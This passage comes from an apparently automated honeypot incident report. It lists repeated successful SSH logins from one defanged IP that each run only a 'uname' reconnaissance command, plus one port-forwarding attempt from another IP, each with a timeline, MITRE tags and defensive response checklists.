| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:15:13` | `cowrie.session.connect` |
| `2026-07-19 10:15:15` | `cowrie.client.version` |
| `2026-07-19 10:15:15` | `cowrie.client.kex` |
| `2026-07-19 10:15:24` | `cowrie.login.success` |
| `2026-07-19 10:15:28` | `cowrie.session.params` |
| `2026-07-19 10:15:28` | `cowrie.command.input` |
| `2026-07-19 10:15:29` | `cowrie.log.closed` |
| `2026-07-19 10:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7b295ff6208

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:15 |
| **Last Seen** | 2026-07-19 10:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:15:32` | `cowrie.session.connect` |
| `2026-07-19 10:15:33` | `cowrie.client.version` |
| `2026-07-19 10:15:33` | `cowrie.client.kex` |
| `2026-07-19 10:15:35` | `cowrie.login.success` |
| `2026-07-19 10:15:37` | `cowrie.session.params` |
| `2026-07-19 10:15:37` | `cowrie.command.input` |
| `2026-07-19 10:15:38` | `cowrie.log.closed` |
| `2026-07-19 10:15:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d23f14fe619a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:15 |
| **Last Seen** | 2026-07-19 10:15 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:15:43` | `cowrie.session.connect` |
| `2026-07-19 10:15:44` | `cowrie.client.version` |
| `2026-07-19 10:15:44` | `cowrie.client.kex` |
| `2026-07-19 10:15:51` | `cowrie.login.success` |
| `2026-07-19 10:15:55` | `cowrie.session.params` |
| `2026-07-19 10:15:55` | `cowrie.command.input` |
| `2026-07-19 10:15:57` | `cowrie.log.closed` |
| `2026-07-19 10:15:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c6653ef84ae

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:15 |
| **Last Seen** | 2026-07-19 10:16 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:15:53` | `cowrie.session.connect` |
| `2026-07-19 10:15:56` | `cowrie.client.version` |
| `2026-07-19 10:15:56` | `cowrie.client.kex` |
| `2026-07-19 10:16:04` | `cowrie.login.success` |
| `2026-07-19 10:16:10` | `cowrie.session.params` |
| `2026-07-19 10:16:10` | `cowrie.command.input` |
| `2026-07-19 10:16:12` | `cowrie.log.closed` |
| `2026-07-19 10:16:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-849dab043eab

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:16 |
| **Last Seen** | 2026-07-19 10:16 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:16:07` | `cowrie.session.connect` |
| `2026-07-19 10:16:09` | `cowrie.client.version` |
| `2026-07-19 10:16:09` | `cowrie.client.kex` |
| `2026-07-19 10:16:20` | `cowrie.login.success` |
| `2026-07-19 10:16:24` | `cowrie.session.params` |
| `2026-07-19 10:16:24` | `cowrie.command.input` |
| `2026-07-19 10:16:25` | `cowrie.log.closed` |
| `2026-07-19 10:16:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-649b7a277e46

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:16 |
| **Last Seen** | 2026-07-19 10:16 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:16:16` | `cowrie.session.connect` |
| `2026-07-19 10:16:20` | `cowrie.client.version` |
| `2026-07-19 10:16:20` | `cowrie.client.kex` |
| `2026-07-19 10:16:26` | `cowrie.login.success` |
| `2026-07-19 10:16:32` | `cowrie.session.params` |
| `2026-07-19 10:16:32` | `cowrie.command.input` |
| `2026-07-19 10:16:35` | `cowrie.log.closed` |
| `2026-07-19 10:16:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9faf3c54e51

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:16 |
| **Last Seen** | 2026-07-19 10:16 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:16:29` | `cowrie.session.connect` |
| `2026-07-19 10:16:32` | `cowrie.client.version` |
| `2026-07-19 10:16:32` | `cowrie.client.kex` |
| `2026-07-19 10:16:45` | `cowrie.login.success` |
| `2026-07-19 10:16:49` | `cowrie.session.params` |
| `2026-07-19 10:16:49` | `cowrie.command.input` |
| `2026-07-19 10:16:51` | `cowrie.log.closed` |
| `2026-07-19 10:16:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f424defb175c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:16 |
| **Last Seen** | 2026-07-19 10:17 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:16:45` | `cowrie.session.connect` |
| `2026-07-19 10:16:47` | `cowrie.client.version` |
| `2026-07-19 10:16:47` | `cowrie.client.kex` |
| `2026-07-19 10:17:04` | `cowrie.login.success` |
| `2026-07-19 10:17:10` | `cowrie.session.params` |
| `2026-07-19 10:17:10` | `cowrie.command.input` |
| `2026-07-19 10:17:12` | `cowrie.log.closed` |
| `2026-07-19 10:17:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-debdb8261d6b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:16 |
| **Last Seen** | 2026-07-19 10:17 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:16:58` | `cowrie.session.connect` |
| `2026-07-19 10:16:59` | `cowrie.client.version` |
| `2026-07-19 10:16:59` | `cowrie.client.kex` |
| `2026-07-19 10:17:08` | `cowrie.login.success` |
| `2026-07-19 10:17:13` | `cowrie.session.params` |
| `2026-07-19 10:17:13` | `cowrie.command.input` |
| `2026-07-19 10:17:16` | `cowrie.log.closed` |
| `2026-07-19 10:17:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-170936f1fafe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:17 |
| **Last Seen** | 2026-07-19 10:17 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:17:11` | `cowrie.session.connect` |
| `2026-07-19 10:17:12` | `cowrie.client.version` |
| `2026-07-19 10:17:12` | `cowrie.client.kex` |
| `2026-07-19 10:17:21` | `cowrie.login.success` |
| `2026-07-19 10:17:24` | `cowrie.session.params` |
| `2026-07-19 10:17:24` | `cowrie.command.input` |
| `2026-07-19 10:17:26` | `cowrie.log.closed` |
| `2026-07-19 10:17:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0becc491862b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:17 |
| **Last Seen** | 2026-07-19 10:17 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:17:24` | `cowrie.session.connect` |
| `2026-07-19 10:17:25` | `cowrie.client.version` |
| `2026-07-19 10:17:25` | `cowrie.client.kex` |
| `2026-07-19 10:17:31` | `cowrie.login.success` |
| `2026-07-19 10:17:34` | `cowrie.session.params` |
| `2026-07-19 10:17:34` | `cowrie.command.input` |
| `2026-07-19 10:17:35` | `cowrie.log.closed` |
| `2026-07-19 10:17:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e9b53730bd0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:17 |
| **Last Seen** | 2026-07-19 10:17 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:17:36` | `cowrie.session.connect` |
| `2026-07-19 10:17:38` | `cowrie.client.version` |
| `2026-07-19 10:17:38` | `cowrie.client.kex` |
| `2026-07-19 10:17:46` | `cowrie.login.success` |
| `2026-07-19 10:17:51` | `cowrie.session.params` |
| `2026-07-19 10:17:51` | `cowrie.command.input` |
| `2026-07-19 10:17:54` | `cowrie.log.closed` |
| `2026-07-19 10:17:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f30636f8fc1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:17 |
| **Last Seen** | 2026-07-19 10:18 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:17:50` | `cowrie.session.connect` |
| `2026-07-19 10:17:52` | `cowrie.client.version` |
| `2026-07-19 10:17:52` | `cowrie.client.kex` |
| `2026-07-19 10:18:03` | `cowrie.login.success` |
| `2026-07-19 10:18:10` | `cowrie.session.params` |
| `2026-07-19 10:18:10` | `cowrie.command.input` |
| `2026-07-19 10:18:12` | `cowrie.log.closed` |
| `2026-07-19 10:18:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ff4a012e566

| Field | Detail |
|---|---|
| **Source IP** | `220.80.221[.]68` |
| **First Seen** | 2026-07-19 10:17 |
| **Last Seen** | 2026-07-19 10:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:17:56` | `cowrie.session.connect` |
| `2026-07-19 10:17:57` | `cowrie.client.version` |
| `2026-07-19 10:17:57` | `cowrie.client.kex` |
| `2026-07-19 10:17:59` | `cowrie.login.success` |
| `2026-07-19 10:17:59` | `cowrie.direct-tcpip.request` |
| `2026-07-19 10:18:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.80.221[.]68` to AbuseIPDB if not already reported
- [ ] Block `220.80.221[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e2c3de2f9b5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:18 |
| **Last Seen** | 2026-07-19 10:18 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:18:01` | `cowrie.session.connect` |
| `2026-07-19 10:18:04` | `cowrie.client.version` |
| `2026-07-19 10:18:04` | `cowrie.client.kex` |
| `2026-07-19 10:18:14` | `cowrie.login.success` |
| `2026-07-19 10:18:18` | `cowrie.session.params` |
| `2026-07-19 10:18:18` | `cowrie.command.input` |
| `2026-07-19 10:18:21` | `cowrie.log.closed` |
| `2026-07-19 10:18:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc56ecb59c35

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:18 |
| **Last Seen** | 2026-07-19 10:18 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:18:16` | `cowrie.session.connect` |
| `2026-07-19 10:18:18` | `cowrie.client.version` |
| `2026-07-19 10:18:18` | `cowrie.client.kex` |
| `2026-07-19 10:18:24` | `cowrie.login.success` |
| `2026-07-19 10:18:26` | `cowrie.session.params` |
| `2026-07-19 10:18:26` | `cowrie.command.input` |
| `2026-07-19 10:18:27` | `cowrie.log.closed` |
| `2026-07-19 10:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b1f40bc1e74

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:18 |
| **Last Seen** | 2026-07-19 10:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:18:31` | `cowrie.session.connect` |
| `2026-07-19 10:18:32` | `cowrie.client.version` |
| `2026-07-19 10:18:32` | `cowrie.client.kex` |
| `2026-07-19 10:18:37` | `cowrie.login.success` |
| `2026-07-19 10:18:38` | `cowrie.session.params` |
| `2026-07-19 10:18:38` | `cowrie.command.input` |
| `2026-07-19 10:18:38` | `cowrie.log.closed` |
| `2026-07-19 10:18:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7340d4bdbda

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:18 |
| **Last Seen** | 2026-07-19 10:18 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:18:41` | `cowrie.session.connect` |
| `2026-07-19 10:18:43` | `cowrie.client.version` |
| `2026-07-19 10:18:43` | `cowrie.client.kex` |
| `2026-07-19 10:18:51` | `cowrie.login.success` |
| `2026-07-19 10:18:55` | `cowrie.session.params` |
| `2026-07-19 10:18:55` | `cowrie.command.input` |
| `2026-07-19 10:18:57` | `cowrie.log.closed` |
| `2026-07-19 10:18:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f2b5b81a628

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:18 |
| **Last Seen** | 2026-07-19 10:19 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:18:58` | `cowrie.session.connect` |
| `2026-07-19 10:18:59` | `cowrie.client.version` |
| `2026-07-19 10:18:59` | `cowrie.client.kex` |
| `2026-07-19 10:19:05` | `cowrie.login.success` |
| `2026-07-19 10:19:11` | `cowrie.session.params` |
| `2026-07-19 10:19:11` | `cowrie.command.input` |
| `2026-07-19 10:19:16` | `cowrie.log.closed` |
| `2026-07-19 10:19:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-199be0bb6457

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:19 |
| **Last Seen** | 2026-07-19 10:19 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:19:06` | `cowrie.session.connect` |
| `2026-07-19 10:19:08` | `cowrie.client.version` |
| `2026-07-19 10:19:08` | `cowrie.client.kex` |
| `2026-07-19 10:19:21` | `cowrie.login.success` |
| `2026-07-19 10:19:24` | `cowrie.session.params` |
| `2026-07-19 10:19:24` | `cowrie.command.input` |
| `2026-07-19 10:19:27` | `cowrie.log.closed` |
| `2026-07-19 10:19:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45a2443a1377

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:19 |
| **Last Seen** | 2026-07-19 10:19 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:19:23` | `cowrie.session.connect` |
| `2026-07-19 10:19:25` | `cowrie.client.version` |
| `2026-07-19 10:19:25` | `cowrie.client.kex` |
| `2026-07-19 10:19:33` | `cowrie.login.success` |
| `2026-07-19 10:19:36` | `cowrie.session.params` |
| `2026-07-19 10:19:36` | `cowrie.command.input` |
| `2026-07-19 10:19:37` | `cowrie.log.closed` |
| `2026-07-19 10:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be57db243bc7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:19 |
| **Last Seen** | 2026-07-19 10:19 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:19:36` | `cowrie.session.connect` |
| `2026-07-19 10:19:38` | `cowrie.client.version` |
| `2026-07-19 10:19:38` | `cowrie.client.kex` |
| `2026-07-19 10:19:47` | `cowrie.login.success` |
| `2026-07-19 10:19:50` | `cowrie.session.params` |
| `2026-07-19 10:19:50` | `cowrie.command.input` |
| `2026-07-19 10:19:52` | `cowrie.log.closed` |
| `2026-07-19 10:19:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b551db3e979

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:19 |
| **Last Seen** | 2026-07-19 10:20 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:19:49` | `cowrie.session.connect` |
| `2026-07-19 10:19:50` | `cowrie.client.version` |
| `2026-07-19 10:19:50` | `cowrie.client.kex` |
| `2026-07-19 10:20:00` | `cowrie.login.success` |
| `2026-07-19 10:20:04` | `cowrie.session.params` |
| `2026-07-19 10:20:04` | `cowrie.command.input` |
| `2026-07-19 10:20:06` | `cowrie.log.closed` |
| `2026-07-19 10:20:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48f874b4b311

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:20 |
| **Last Seen** | 2026-07-19 10:20 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:20:03` | `cowrie.session.connect` |
| `2026-07-19 10:20:04` | `cowrie.client.version` |
| `2026-07-19 10:20:04` | `cowrie.client.kex` |
| `2026-07-19 10:20:10` | `cowrie.login.success` |
| `2026-07-19 10:20:13` | `cowrie.session.params` |
| `2026-07-19 10:20:13` | `cowrie.command.input` |
| `2026-07-19 10:20:15` | `cowrie.log.closed` |
| `2026-07-19 10:20:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77c7e5364041

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:20 |
| **Last Seen** | 2026-07-19 10:20 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:20:16` | `cowrie.session.connect` |
| `2026-07-19 10:20:17` | `cowrie.client.version` |
| `2026-07-19 10:20:17` | `cowrie.client.kex` |
| `2026-07-19 10:20:24` | `cowrie.login.success` |
| `2026-07-19 10:20:28` | `cowrie.session.params` |
| `2026-07-19 10:20:28` | `cowrie.command.input` |
| `2026-07-19 10:20:31` | `cowrie.log.closed` |
| `2026-07-19 10:20:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-130a6009cde4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:20 |
| **Last Seen** | 2026-07-19 10:20 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:20:25` | `cowrie.session.connect` |
| `2026-07-19 10:20:27` | `cowrie.client.version` |
| `2026-07-19 10:20:27` | `cowrie.client.kex` |
| `2026-07-19 10:20:39` | `cowrie.login.success` |
| `2026-07-19 10:20:46` | `cowrie.session.params` |
| `2026-07-19 10:20:46` | `cowrie.command.input` |
| `2026-07-19 10:20:48` | `cowrie.log.closed` |
| `2026-07-19 10:20:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
